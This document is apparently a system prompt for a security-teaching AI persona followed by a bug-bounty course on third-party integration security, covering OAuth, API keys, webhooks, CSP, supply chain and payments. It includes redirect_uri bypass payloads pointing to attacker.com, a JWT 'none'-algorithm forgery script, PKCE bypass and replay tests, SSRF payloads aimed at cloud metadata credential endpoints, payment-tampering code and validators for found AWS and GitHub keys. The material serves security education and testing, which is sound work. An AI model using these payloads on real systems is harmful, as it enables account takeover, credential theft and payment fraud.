You are an elite Third-Party Integration Security Learning AI, specializing in teaching external service and API integration security assessment. Your expertise focuses on educating bug bounty hunters about supply chain vulnerabilities, integration weaknesses, and third-party component security testing.

Your mission is to guide aspiring security researchers through third-party integration complexities, teaching them systematic approaches to testing external integrations, identifying supply chain risks, and developing secure integration practices.

Key Learning Objectives:
- **Integration Architecture**: Master third-party service integration patterns and architectures
- **API Integration Security**: Learn external API consumption and security testing
- **OAuth and Social Login**: Study OAuth flow and social authentication security
- **Payment Integration**: Assess payment gateway and processor security
- **CDN and External Resources**: Test content delivery network and external resource security
- **Analytics and Tracking**: Learn analytics service and tracking pixel security
- **Widget and Embed Security**: Assess third-party widget and embed security

Advanced Learning Concepts:
- **OAuth Misconfigurations**: Study OAuth client and server misconfiguration exploitation
- **Payment Data Exposure**: Learn payment processing data protection assessment
- **CDN Subdomain Takeover**: Test content delivery network subdomain vulnerabilities
- **Analytics Data Leakage**: Assess analytics service data collection and privacy
- **Widget XSS Vulnerabilities**: Study third-party widget cross-site scripting risks
- **Supply Chain Attacks**: Learn dependency and supply chain vulnerability assessment
- **Integration Token Security**: Test API keys and integration token management

Learning Process:
1. **Integration Fundamentals**: Understand third-party integration patterns and security considerations
2. **API Security**: Learn external API consumption and security testing
3. **Authentication Integration**: Study OAuth and social login security assessment
4. **Payment Security**: Assess payment integration and data protection
5. **Resource Loading**: Test CDN and external resource security
6. **Analytics Security**: Learn analytics and tracking service security
7. **Secure Implementation**: Develop secure third-party integration practices

Teaching Methodology:
- **Integration Labs**: Hands-on third-party integration security testing exercises
- **API Workshops**: External API consumption security assessment training
- **OAuth Exercises**: OAuth flow and social login security testing labs
- **Payment Tutorials**: Payment gateway security assessment guides
- **CDN Labs**: Content delivery network security testing frameworks
- **Analytics Workshops**: Analytics service security assessment exercises
- **Real-World Scenarios**: Case studies of third-party integration vulnerabilities

Output Format:
- **Integration Modules**: Structured learning units for third-party integration concepts
- **API Exercises**: Practical external API security testing labs
- **OAuth Labs**: OAuth flow and social login security assessment exercises
- **Payment Workshops**: Payment gateway security testing guides
- **CDN Tutorials**: Content delivery network security assessment frameworks
- **Analytics Labs**: Analytics service security testing exercises
- **Case Studies**: Real-world third-party integration vulnerability examples

Example Learning Query: "Teach me third-party integration security from basics to expert level"

---

## MODULE 1: OAuth Integration Security

### 1.1 OAuth 2.0 Flow Fundamentals

OAuth 2.0 is the industry-standard protocol for authorization. Understanding each flow is critical for identifying integration vulnerabilities.

**Authorization Code Flow (Most Secure for Server-Side Apps):**
```
Client App → Authorization Server → User Consent → Authorization Code → Token Exchange → Access Token
```

**Authorization Code Flow with PKCE (For Public Clients):**
```http
GET /authorize?
  response_type=code
  &client_id=CLIENT_ID
  &redirect_uri=https://app.example.com/callback
  &scope=read write
  &state=xyzRandom123
  &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
  &code_challenge_method=S256
```

**Implicit Flow (Deprecated - Legacy Systems):**
```
Client App → Authorization Server → Access Token in Fragment → Client Extracts Token
```

**Client Credentials Flow (Machine-to-Machine):**
```http
POST /token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
&client_id=SERVICE_ID
&client_secret=SERVICE_SECRET
&scope=internal-api
```

### 1.2 OAuth Vulnerability Taxonomy

| Vulnerability | Impact | Likelihood | CVSS Range |
|---|---|---|---|
| Open Redirect via redirect_uri | Account Takeover | High | 8.0-9.0 |
| Missing state parameter | CSRF → Account Linking | High | 7.0-8.0 |
| PKCE bypass | Token Theft | Medium | 7.0-8.5 |
| Token leakage via Referer | Session Hijacking | Medium | 6.5-7.5 |
| Insufficient scope validation | Privilege Escalation | High | 7.5-9.0 |
| JWT algorithm confusion | Authentication Bypass | High | 8.0-9.5 |

### 1.3 redirect_uri Validation Testing

**Common Bypass Techniques:**
```bash
# Test 1: Subdomain takeover
redirect_uri=https://attacker-controlled.example.com/callback

# Test 2: Path traversal
redirect_uri=https://app.example.com/callback/../../../attacker.com

# Test 3: URL parameter injection
redirect_uri=https://app.example.com/callback?next=https://attacker.com

# Test 4: Open redirect chain
redirect_uri=https://app.example.com/redirect?url=https://attacker.com

# Test 5: Wildcard subdomain match bypass
redirect_uri=https://anything-callback.example.com/callback

# Test 6: @ symbol abuse
redirect_uri=https://app.example.com@attacker.com/callback

# Test 7: Backslash bypass
redirect_uri=https://app.example.com\@attacker.com/callback

# Test 8: Unicode normalization
redirect_uri=https://app.example.com/callback%EF%BC%8F@attacker.com
```

**Testing Script:**
```python
import requests
import urllib.parse

def test_redirect_uri(base_auth_url, client_id, redirect_uris):
    """Test redirect_uri validation bypass"""
    results = []
    
    for uri in redirect_uris:
        params = {
            'response_type': 'code',
            'client_id': client_id,
            'redirect_uri': uri,
            'scope': 'openid profile email',
            'state': 'test123'
        }
        
        response = requests.get(base_auth_url, params=params, allow_redirects=False)
        
        if response.status_code in [301, 302, 303]:
            location = response.headers.get('Location', '')
            if 'attacker' in location or uri not in redirect_uris:
                results.append({
                    'uri': uri,
                    'status': 'VULNERABLE',
                    'redirect': location
                })
            else:
                results.append({
                    'uri': uri,
                    'status': 'BLOCKED',
                    'redirect': location
                })
        elif response.status_code == 400:
            results.append({'uri': uri, 'status': 'BLOCKED'})
        else:
            results.append({'uri': uri, 'status': 'UNKNOWN', 'code': response.status_code})
    
    return results

# Test URIs
test_uris = [
    'https://app.example.com/callback',
    'https://attacker.com/callback',
    'https://app.example.com/callback@attacker.com',
    'https://app.example.com.attacker.com/callback',
    'https://app.example.com/callback/../attacker.com',
]
```

### 1.4 PKCE Implementation Testing

```python
import hashlib
import base64
import secrets

def generate_pkce_pair():
    """Generate PKCE code_verifier and code_challenge"""
    code_verifier = secrets.token_urlsafe(32)
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode()
    return code_verifier, code_challenge

def test_pkce_bypass(token_endpoint, auth_code, original_verifier, stolen_verifier=None):
    """Test if PKCE can be bypassed with stolen code"""
    # Attempt 1: Use stolen code without verifier
    response1 = requests.post(token_endpoint, data={
        'grant_type': 'authorization_code',
        'code': auth_code,
        'redirect_uri': 'https://app.example.com/callback'
    })
    
    # Attempt 2: Use stolen code with empty verifier
    response2 = requests.post(token_endpoint, data={
        'grant_type': 'authorization_code',
        'code': auth_code,
        'redirect_uri': 'https://app.example.com/callback',
        'code_verifier': ''
    })
    
    # Attempt 3: Use stolen code with attacker's verifier
    if stolen_verifier:
        response3 = requests.post(token_endpoint, data={
            'grant_type': 'authorization_code',
            'code': auth_code,
            'redirect_uri': 'https://app.example.com/callback',
            'code_verifier': stolen_verifier
        })
    
    return {
        'no_verifier': response1.status_code,
        'empty_verifier': response2.status_code,
        'wrong_verifier': response3.status_code if stolen_verifier else None
    }
```

### 1.5 JWT Token Security in OAuth

```python
import jwt
import json
import base64

def analyze_jwt(token):
    """Decode and analyze JWT token for vulnerabilities"""
    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
        
        analysis = {
            'algorithm': header.get('alg'),
            'key_id': header.get('kid'),
            'issuer': payload.get('iss'),
            'audience': payload.get('aud'),
            'expiry': payload.get('exp'),
            'issued_at': payload.get('iat'),
            'subject': payload.get('sub'),
            'vulnerabilities': []
        }
        
        # Check for algorithm vulnerabilities
        if header.get('alg') == 'none':
            analysis['vulnerabilities'].append('CRITICAL: Algorithm none - signature bypass possible')
        
        if header.get('alg') in ['HS256', 'HS384', 'HS512']:
            analysis['vulnerabilities'].append('WARNING: Symmetric algorithm - may be vulnerable to key confusion')
        
        if header.get('alg') in ['RS256', 'RS384', 'RS512']:
            analysis['vulnerabilities'].append('INFO: Asymmetric algorithm - check for public key leakage')
        
        # Check for missing claims
        if not payload.get('iss'):
            analysis['vulnerabilities'].append('WARNING: Missing issuer claim')
        if not payload.get('aud'):
            analysis['vulnerabilities'].append('WARNING: Missing audience claim')
        if not payload.get('exp'):
            analysis['vulnerabilities'].append('WARNING: No expiry set - token never expires')
        
        # Check for sensitive data in token
        sensitive_keys = ['password', 'secret', 'token', 'key', 'ssn', 'credit']
        for key in payload.keys():
            if any(s in key.lower() for s in sensitive_keys):
                analysis['vulnerabilities'].append(f'WARNING: Sensitive data in token: {key}')
        
        return analysis
    except Exception as e:
        return {'error': str(e)}

def test_jwt_none_algorithm(token_endpoint, valid_token):
    """Test JWT none algorithm attack"""
    # Decode existing token
    header = jwt.get_unverified_header(valid_token)
    payload = jwt.decode(valid_token, options={"verify_signature": False})
    
    # Create token with none algorithm
    none_header = {'alg': 'none', 'typ': 'JWT'}
    none_token = jwt.encode(payload, key='', algorithm='none')
    
    # Test if server accepts it
    response = requests.get(
        'https://api.example.com/protected',
        headers={'Authorization': f'Bearer {none_token}'}
    )
    
    return {
        'status_code': response.status_code,
        'accepted': response.status_code == 200,
        'risk': 'CRITICAL' if response.status_code == 200 else 'NONE'
    }
```

### Practical Exercise 1.1: OAuth Attack Lab

**Setup:**
1. Deploy a vulnerable OAuth application (e.g., using oauthlib)
2. Configure with intentional misconfigurations
3. Practice the following attacks:

**Tasks:**
- [ ] Perform authorization code interception via open redirect
- [ ] Bypass state parameter validation
- [ ] Test redirect_uri validation with 8+ bypass techniques
- [ ] Extract tokens from URL fragments
- [ ] Perform JWT algorithm confusion attack
- [ ] Chain OAuth flaw with account takeover

**Expected Output:** Document each vulnerability with PoC and impact assessment.

---

## MODULE 2: API Key Management Security

### 2.1 API Key Exposure Patterns

```bash
# Common locations where API keys leak

# 1. JavaScript source code
grep -r "api_key\|apikey\|api-key\|API_KEY\|secret\|SECRET" --include="*.js" .

# 2. HTML source
grep -r "api_key\|apikey\|api-key" --include="*.html" .

# 3. Configuration files
find . -name "*.env" -o -name "*.config" -o -name "*.json" -o -name "*.yaml" | \
  xargs grep -l "key\|secret\|token" 2>/dev/null

# 4. Git history
git log --all --full-history -- "*.env" "*.config"
git log -p --all -S "api_key" -- "*.js" "*.html"

# 5. Source maps
find . -name "*.map" | head -20

# 6. Package files
find . -name "package.json" -exec grep -l "key\|secret" {} \;

# 7. Docker files
find . -name "Dockerfile*" -o -name "docker-compose*" | \
  xargs grep -i "key\|secret\|token" 2>/dev/null

# 8. CI/CD files
find . -name ".github" -o -name ".gitlab-ci.yml" -o -name "Jenkinsfile" | \
  xargs grep -i "key\|secret\|token" 2>/dev/null
```

### 2.2 API Key Security Assessment Script

```python
import re
import json
import requests

class APIKeyAuditor:
    def __init__(self):
        self.patterns = {
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret_key': r'(?i)aws[_\-]?secret[_\-]?access[_\-]?key["\s:=]+["\']?([A-Za-z0-9/+=]{40})',
            'github_token': r'ghp_[A-Za-z0-9]{36}',
            'github_oauth': r'gho_[A-Za-z0-9]{36}',
            'slack_token': r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}',
            'stripe_key': r'[sr]k_(live|test)_[0-9a-zA-Z]{24,}',
            'google_api': r'AIza[0-9A-Za-z\-_]{35}',
            'heroku_api': r'(?i)heroku[_\-]?api[_\-]?key["\s:=]+["\']?([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})',
            'generic_api_key': r'(?i)(api[_\-]?key|apikey|api[_\-]?secret)["\s:=]+["\']?([A-Za-z0-9\-_]{20,})',
            'generic_secret': r'(?i)(secret|password|token)["\s:=]+["\']?([A-Za-z0-9\-_/+=]{20,})',
        }
        
    def scan_file(self, filepath):
        """Scan a file for API keys"""
        findings = []
        try:
            with open(filepath, 'r', errors='ignore') as f:
                content = f.read()
                for line_num, line in enumerate(content.split('\n'), 1):
                    for key_type, pattern in self.patterns.items():
                        matches = re.findall(pattern, line)
                        for match in matches:
                            findings.append({
                                'file': filepath,
                                'line': line_num,
                                'type': key_type,
                                'match': match[:8] + '...' if len(match) > 8 else match,
                                'context': line.strip()[:100]
                            })
        except Exception as e:
            pass
        return findings
    
    def validate_aws_key(self, access_key, secret_key):
        """Validate AWS credentials"""
        try:
            import boto3
            from botocore.exceptions import ClientError
            
            client = boto3.client(
                'sts',
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key
            )
            identity = client.get_caller_identity()
            return {
                'valid': True,
                'account': identity['Account'],
                'arn': identity['Arn'],
                'user_id': identity['UserId']
            }
        except ClientError as e:
            return {'valid': False, 'error': str(e)}
    
    def validate_github_token(self, token):
        """Validate GitHub token"""
        headers = {'Authorization': f'token {token}'}
        response = requests.get('https://api.github.com/user', headers=headers)
        if response.status_code == 200:
            data = response.json()
            return {
                'valid': True,
                'user': data.get('login'),
                'scopes': response.headers.get('X-OAuth-Scopes'),
                'rate_limit': response.headers.get('X-RateLimit-Remaining')
            }
        return {'valid': False}
    
    def generate_report(self, findings):
        """Generate security report"""
        report = {
            'total_findings': len(findings),
            'by_type': {},
            'by_severity': {'critical': [], 'high': [], 'medium': [], 'low': []},
            'recommendations': []
        }
        
        for finding in findings:
            key_type = finding['type']
            report['by_type'][key_type] = report['by_type'].get(key_type, 0) + 1
            
            if 'aws' in key_type or 'github' in key_type:
                report['by_severity']['critical'].append(finding)
            elif 'stripe' in key_type or 'google' in key_type:
                report['by_severity']['high'].append(finding)
            else:
                report['by_severity']['medium'].append(finding)
        
        if report['by_severity']['critical']:
            report['recommendations'].append('IMMEDIATE: Rotate all cloud provider credentials')
        if report['by_type'].get('generic_api_key', 0) > 0:
            report['recommendations'].append('Review generic API key exposure in source code')
        
        return report
```

### 2.3 API Key Rotation Testing

```python
def test_key_rotation(api_endpoint, old_key, new_key):
    """Test if old API keys are properly invalidated after rotation"""
    results = {}
    
    # Test with old key
    response_old = requests.get(
        api_endpoint,
        headers={'Authorization': f'Bearer {old_key}'}
    )
    results['old_key'] = {
        'status': response_old.status_code,
        'valid': response_old.status_code == 200
    }
    
    # Test with new key
    response_new = requests.get(
        api_endpoint,
        headers={'Authorization': f'Bearer {new_key}'}
    )
    results['new_key'] = {
        'status': response_new.status_code,
        'valid': response_new.status_code == 200
    }
    
    # Assessment
    if results['old_key']['valid'] and results['new_key']['valid']:
        results['assessment'] = 'VULNERABLE: Old key still valid after rotation'
    elif not results['old_key']['valid'] and results['new_key']['valid']:
        results['assessment'] = 'SECURE: Old key properly invalidated'
    else:
        results['assessment'] = 'ERROR: New key not working'
    
    return results
```

### Practical Exercise 2.1: API Key Exposure Audit

**Tasks:**
- [ ] Scan a target's JavaScript bundles for hardcoded API keys
- [ ] Check git history for committed secrets
- [ ] Analyze source maps for sensitive information
- [ ] Test API key validation endpoints
- [ ] Document key rotation policies
- [ ] Assess impact of exposed keys

---

## MODULE 3: Webhook Security

### 3.1 Webhook Validation Implementation

```python
import hmac
import hashlib
import time
from functools import wraps

# HMAC Signature Validation (e.g., GitHub, Stripe)
def validate_webhook_signature(payload, signature, secret, tolerance=300):
    """Validate webhook HMAC signature"""
    if not signature:
        return False
    
    # Remove algorithm prefix if present
    if signature.startswith('sha256='):
        signature = signature[7:]
    
    # Calculate expected signature
    expected = hmac.new(
        secret.encode(),
        payload.encode(),
        hashlib.sha256
    ).hexdigest()
    
    return hmac.compare_digest(expected, signature)

# Timestamp-based Replay Protection
def validate_webhook_timestamp(timestamp, tolerance=300):
    """Validate webhook timestamp to prevent replay attacks"""
    try:
        webhook_time = int(timestamp)
        current_time = int(time.time())
        return abs(current_time - webhook_time) <= tolerance
    except (ValueError, TypeError):
        return False

# Combined Validation Decorator
def secure_webhook(secret, tolerance=300):
    def decorator(func):
        @wraps(func)
        def wrapper(request, *args, **kwargs):
            # Get signature and timestamp
            signature = request.headers.get('X-Hub-Signature-256', '')
            timestamp = request.headers.get('X-Hub-Timestamp', '')
            
            # Validate timestamp
            if not validate_webhook_timestamp(timestamp, tolerance):
                return {'error': 'Invalid timestamp'}, 403
            
            # Validate signature
            payload = request.body.decode('utf-8')
            if not validate_webhook_signature(payload, signature, secret):
                return {'error': 'Invalid signature'}, 403
            
            return func(request, *args, **kwargs)
        return wrapper
    return decorator
```

### 3.2 Webhook SSRF Testing

```python
def test_webhook_ssrf(webhook_endpoint):
    """Test webhook endpoints for SSRF vulnerabilities"""
    ssrf_payloads = [
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://localhost:8080/admin',
        'http://[::1]:8080/',
        'http://0x7f000001/',
        'http://2130706433/',
        'http://127.0.0.1:22/',
        'http://metadata.google.internal/',
    ]
    
    results = []
    for payload in ssrf_payloads:
        webhook_data = {
            'url': payload,
            'event': 'test',
            'data': {}
        }
        
        response = requests.post(webhook_endpoint, json=webhook_data)
        results.append({
            'payload': payload,
            'status': response.status_code,
            'response_length': len(response.text),
            'contains_meta': 'ami-id' in response.text or 'instance' in response.text
        })
    
    return results
```

### 3.3 Webhook Replay Attack Testing

```python
import time
import hashlib

def test_webhook_replay(webhook_endpoint, secret, legitimate_payload):
    """Test webhook replay attack protection"""
    # Create legitimate request
    signature = hmac.new(
        secret.encode(),
        legitimate_payload.encode(),
        hashlib.sha256
    ).hexdigest()
    
    headers = {
        'Content-Type': 'application/json',
        'X-Hub-Signature-256': f'sha256={signature}',
        'X-Hub-Timestamp': str(int(time.time()))
    }
    
    # Send legitimate request
    response1 = requests.post(webhook_endpoint, data=legitimate_payload, headers=headers)
    
    # Replay same request immediately
    response2 = requests.post(webhook_endpoint, data=legitimate_payload, headers=headers)
    
    # Replay with old timestamp
    old_headers = headers.copy()
    old_headers['X-Hub-Timestamp'] = str(int(time.time()) - 600)
    response3 = requests.post(webhook_endpoint, data=legitimate_payload, headers=old_headers)
    
    return {
        'first_request': response1.status_code,
        'replay_same_timestamp': response2.status_code,
        'replay_old_timestamp': response3.status_code,
        'vulnerable': response2.status_code == 200
    }
```

### Practical Exercise 3.1: Webhook Security Lab

**Tasks:**
- [ ] Implement HMAC signature validation
- [ ] Test webhook endpoints for SSRF
- [ ] Perform replay attacks on webhook handlers
- [ ] Test webhook secret rotation
- [ ] Implement rate limiting on webhook endpoints
- [ ] Document webhook security architecture

---

## MODULE 4: Third-Party Script Analysis

### 4.1 Content Security Policy (CSP) Analysis

```python
def analyze_csp(csp_header):
    """Analyze Content Security Policy for weaknesses"""
    analysis = {
        'directives': {},
        'vulnerabilities': [],
        'recommendations': []
    }
    
    if not csp_header:
        analysis['vulnerabilities'].append('CRITICAL: No CSP header present')
        return analysis
    
    # Parse CSP
    directives = csp_header.split(';')
    for directive in directives:
        parts = directive.strip().split()
        if parts:
            directive_name = parts[0]
            directive_values = parts[1:]
            analysis['directives'][directive_name] = directive_values
    
    # Check for unsafe directives
    if "'unsafe-inline'" in str(analysis['directives']):
        analysis['vulnerabilities'].append('HIGH: unsafe-inline allows inline scripts')
    
    if "'unsafe-eval'" in str(analysis['directives']):
        analysis['vulnerabilities'].append('CRITICAL: unsafe-eval allows eval()')
    
    if '*' in str(analysis['directives'].get('script-src', [])):
        analysis['vulnerabilities'].append('CRITICAL: Wildcard in script-src')
    
    # Check for missing security directives
    if 'frame-ancestors' not in analysis['directives']:
        analysis['recommendations'].append('Add frame-ancestors directive')
    
    if 'base-uri' not in analysis['directives']:
        analysis['recommendations'].append('Add base-uri directive')
    
    if 'form-action' not in analysis['directives']:
        analysis['recommendations'].append('Add form-action directive')
    
    return analysis
```

### 4.2 Subresource Integrity (SRI) Testing

```python
import hashlib
import requests

def test_sri(url):
    """Test if external resource has SRI hash"""
    response = requests.get(url)
    if response.status_code == 200:
        content = response.content
        sha384 = hashlib.sha384(content).digest()
        import base64
        sri_hash = 'sha384-' + base64.b64encode(sha384).decode()
        return {
            'url': url,
            'sri_hash': sri_hash,
            'content_length': len(content),
            'has_sri': False  # Would need to check HTML for this
        }
    return None

def check_sri_in_html(html_content, external_urls):
    """Check if external scripts have SRI attributes"""
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html_content, 'html.parser')
    
    results = []
    scripts = soup.find_all('script', src=True)
    for script in scripts:
        src = script.get('src')
        if src in external_urls:
            integrity = script.get('integrity')
            results.append({
                'src': src,
                'has_integrity': integrity is not None,
                'integrity_value': integrity
            })
    
    return results
```

### 4.3 Third-Party Script Risk Assessment

```python
def assess_third_party_risks(html_content):
    """Assess risks from third-party scripts"""
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html_content, 'html.parser')
    
    risks = {
        'scripts': [],
        'iframes': [],
        'tracking_pixels': [],
        'total_third_party': 0
    }
    
    # Analyze scripts
    scripts = soup.find_all('script', src=True)
    for script in scripts:
        src = script.get('src', '')
        if not src.startswith('/') and '//' in src:
            risks['scripts'].append({
                'src': src,
                'async': script.get('async') is not None,
                'defer': script.get('defer') is not None,
                'integrity': script.get('integrity') is not None,
                'csp_nonce': script.get('nonce') is not None
            })
            risks['total_third_party'] += 1
    
    # Analyze iframes
    iframes = soup.find_all('iframe', src=True)
    for iframe in iframes:
        src = iframe.get('src', '')
        if not src.startswith('/'):
            risks['iframes'].append({
                'src': src,
                'sandbox': iframe.get('sandbox') is not None,
                'allow': iframe.get('allow')
            })
            risks['total_third_party'] += 1
    
    # Analyze tracking pixels
    images = soup.find_all('img', width='1', height='1')
    for img in images:
        src = img.get('src', '')
        if 'track' in src.lower() or 'pixel' in src.lower():
            risks['tracking_pixels'].append({'src': src})
            risks['total_third_party'] += 1
    
    return risks
```

### Practical Exercise 4.1: Third-Party Script Audit

**Tasks:**
- [ ] Analyze CSP headers on target sites
- [ ] Test SRI implementation on external scripts
- [ ] Map all third-party dependencies
- [ ] Identify tracking scripts and pixels
- [ ] Assess subdomain takeover risks
- [ ] Document supply chain attack vectors

---

## MODULE 5: Supply Chain Security

### 5.1 Dependency Confusion Testing

```python
import requests
import json

def test_dependency_confusion(package_name, registry_url='https://registry.npmjs.org'):
    """Test for potential dependency confusion"""
    # Check if package exists on public registry
    response = requests.get(f'{registry_url}/{package_name}')
    
    if response.status_code == 404:
        return {
            'package': package_name,
            'exists_public': False,
            'risk': 'HIGH - Potential dependency confusion target',
            'recommendation': 'Check for internal package with same name'
        }
    else:
        data = response.json()
        return {
            'package': package_name,
            'exists_public': True,
            'latest_version': data.get('dist-tags', {}).get('latest'),
            'risk': 'LOW - Package already exists',
            'publishers': [user.get('name') for user in data.get('maintainers', [])]
        }

def scan_internal_packages(package_list_file):
    """Scan internal packages for dependency confusion risk"""
    with open(package_list_file, 'r') as f:
        packages = f.read().split('\n')
    
    results = []
    for package in packages:
        if package.strip():
            result = test_dependency_confusion(package.strip())
            results.append(result)
    
    return results
```

### 5.2 Typosquatting Detection

```python
import Levenshtein

def detect_typosquatting(package_name, similar_packages):
    """Detect potential typosquatting packages"""
    results = []
    
    for candidate in similar_packages:
        if candidate == package_name:
            continue
        
        # Calculate edit distance
        distance = Levenshtein.distance(package_name, candidate)
        
        # Calculate similarity ratio
        ratio = Levenshtein.ratio(package_name, candidate)
        
        if distance <= 2 and ratio > 0.8:
            results.append({
                'original': package_name,
                'candidate': candidate,
                'edit_distance': distance,
                'similarity': ratio,
                'risk': 'HIGH' if distance == 1 else 'MEDIUM'
            })
    
    return results
```

### Practical Exercise 5.1: Supply Chain Security Audit

**Tasks:**
- [ ] Identify all npm/pip/gem dependencies
- [ ] Check for known vulnerabilities in dependencies
- [ ] Test for dependency confusion on internal packages
- [ ] Analyze package publisher reputation
- [ ] Review dependency update policies
- [ ] Document supply chain attack mitigations

---

## MODULE 6: Payment Integration Security

### 6.1 Payment Webhook Validation

```python
import stripe
import hashlib
import hmac

def validate_stripe_webhook(payload, sig_header, endpoint_secret):
    """Validate Stripe webhook signature"""
    try:
        event = stripe.Webhook.construct_event(
            payload, sig_header, endpoint_secret
        )
        return {'valid': True, 'event': event}
    except stripe.error.SignatureVerificationError as e:
        return {'valid': False, 'error': str(e)}

def test_payment_amount_tampering(order_id, original_amount, tampered_amount):
    """Test if payment amount can be tampered"""
    # This tests if the server validates amount server-side
    payload = {
        'order_id': order_id,
        'amount': tampered_amount,
        'currency': 'USD'
    }
    
    response = requests.post('https://api.example.com/payment/process', json=payload)
    
    return {
        'original_amount': original_amount,
        'tampered_amount': tampered_amount,
        'server_accepted': response.status_code == 200,
        'vulnerable': response.status_code == 200 and tampered_amount < original_amount
    }
```

### Practical Exercise 6.1: Payment Integration Lab

**Tasks:**
- [ ] Test payment amount validation
- [ ] Verify webhook signature validation
- [ ] Test for race conditions in payment processing
- [ ] Assess PCI DSS compliance
- [ ] Document payment security architecture

---

## ASSESSMENT QUESTIONS

### Section A: Multiple Choice (10 questions)

1. **Which OAuth flow is most vulnerable to authorization code interception?**
   - A) Authorization Code with PKCE
   - B) Implicit Flow
   - C) Client Credentials
   - D) Device Authorization

2. **What is the primary risk of missing state parameter in OAuth?**
   - A) Token leakage
   - B) CSRF attacks
   - C) Replay attacks
   - D) Man-in-the-middle

3. **Which header indicates a webhook signature?**
   - A) X-Webhook-Signature
   - B) X-Hub-Signature-256
   - C) Authorization
   - D) X-Request-Signature

### Section B: Practical (5 scenarios)

1. **Scenario:** You find a redirect_uri parameter in an OAuth flow that accepts any URL.
   - Document the attack chain
   - Write a PoC
   - Assess impact

2. **Scenario:** A webhook endpoint processes user data without signature validation.
   - Identify vulnerabilities
   - Propose fixes
   - Test for SSRF

### Section C: Code Review (3 exercises)

1. Review the OAuth implementation code and identify all vulnerabilities
2. Analyze the webhook handler for security flaws
3. Assess the API key management practices

---

## FURTHER READING

### Essential Resources
- OAuth 2.0 Security Best Current Practice (RFC 9700)
- OWASP API Security Top 10 2023
- NIST SP 800-63C: Digital Identity Guidelines
- PCI DSS v4.0 Requirements

### Tools
- Burp Suite OAuth Plugin
- oauth2-proxy
- OIDC Debugger
- JWT Tool (jwt_tool)

### Practice Platforms
- OWASP WebGoat
- DVWS (Damn Vulnerable Web Services)
- OAuth.com Practice Server
- Auth0 Security Lab

---

## MODULE 7: CDN and Subdomain Takeover

### 7.1 CDN Security Assessment

```python
def assess_cdn_security(domain):
    """Assess CDN security configuration"""
    import requests
    
    results = {
        'cdn_provider': None,
        'ssl_config': {},
        'headers': {},
        'vulnerabilities': []
    }
    
    response = requests.get(f'https://{domain}', allow_redirects=True)
    
    # Identify CDN
    cdn_headers = {
        'X-Cache': 'Cloudflare/Akamai',
        'X-CDN': 'Imperva',
        'X-Served-By': 'Fastly',
        'X-Akamai-Transformed': 'Akamai'
    }
    
    for header, provider in cdn_headers.items():
        if header.lower() in [h.lower() for h in response.headers]:
            results['cdn_provider'] = provider
            break
    
    # Check SSL configuration
    results['ssl_config'] = {
        'tls_version': response.headers.get('Strict-Transport-Security'),
        'expect_ct': response.headers.get('Expect-CT'),
        'report_to': response.headers.get('Report-To')
    }
    
    return results
```

### 7.2 Subdomain Takeover Detection

```python
import dns.resolver

def detect_subdomain_takeover(domain):
    """Detect potential subdomain takeover vulnerabilities"""
    # CNAME records that indicate vulnerable services
    vulnerable_cnames = {
        'amazonaws.com': 'AWS S3/CloudFront',
        'herokuapp.com': 'Heroku',
        'github.io': 'GitHub Pages',
        'azurewebsites.net': 'Azure',
        'cloudfront.net': 'CloudFront',
        's3.amazonaws.com': 'AWS S3',
        'shopify.com': 'Shopify',
        'surge.sh': 'Surge',
        'bitbucket.io': 'Bitbucket'
    }
    
    results = []
    
    # Get subdomains from various sources
    subdomains = get_subdomains(domain)  # Implement this function
    
    for subdomain in subdomains:
        try:
            answers = dns.resolver.resolve(subdomain, 'CNAME')
            for rdata in answers:
                cname = str(rdata.target).rstrip('.')
                for vulnerable, provider in vulnerable_cnames.items():
                    if vulnerable in cname:
                        # Check if claimed
                        response = requests.get(f'https://{subdomain}', timeout=5)
                        if response.status_code == 404 or 'NoSuchBucket' in response.text:
                            results.append({
                                'subdomain': subdomain,
                                'cname': cname,
                                'provider': provider,
                                'status': 'VULNERABLE',
                                'confidence': 'HIGH'
                            })
        except:
            pass
    
    return results
```

### Practical Exercise 7.1: CDN and Subdomain Takeover Lab

**Tasks:**
- [ ] Enumerate subdomains of target domain
- [ ] Check CNAME records for vulnerable services
- [ ] Test if claimed subdomains can be taken over
- [ ] Assess CDN SSL configuration
- [ ] Document takeover prevention measures

---

## MODULE 8: Integration Security Architecture

### 8.1 Secure Integration Patterns

```
┌─────────────────────────────────────────────────────────────┐
│                    SECURITY ARCHITECTURE                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐  │
│  │   Client     │───▶│   Gateway    │───▶│   Service    │  │
│  │   App        │    │   (WAF)      │    │   Provider   │  │
│  └──────────────┘    └──────────────┘    └──────────────┘  │
│         │                    │                    │          │
│         ▼                    ▼                    ▼          │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐  │
│  │   Token      │    │   Rate       │    │   Webhook    │  │
│  │   Validation │    │   Limiting   │    │   Validation │  │
│  └──────────────┘    └──────────────┘    └──────────────┘  │
│                                                              │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐  │
│  │   Input      │    │   Logging    │    │   Audit      │  │
│  │   Validation │    │   & Monitor  │    │   Trail      │  │
│  └──────────────┘    └──────────────┘    └──────────────┘  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 8.2 Integration Security Checklist

```markdown
## Pre-Integration Security Checklist

### Authentication & Authorization
- [ ] OAuth 2.0 implementation follows best practices
- [ ] API keys are not hardcoded in source code
- [ ] Token rotation policy is implemented
- [ ] Scope follows principle of least privilege
- [ ] MFA is enforced for sensitive operations

### Data Protection
- [ ] All data in transit is encrypted (TLS 1.2+)
- [ ] Sensitive data is encrypted at rest
- [ ] PII is handled according to privacy regulations
- [ ] Data retention policies are defined
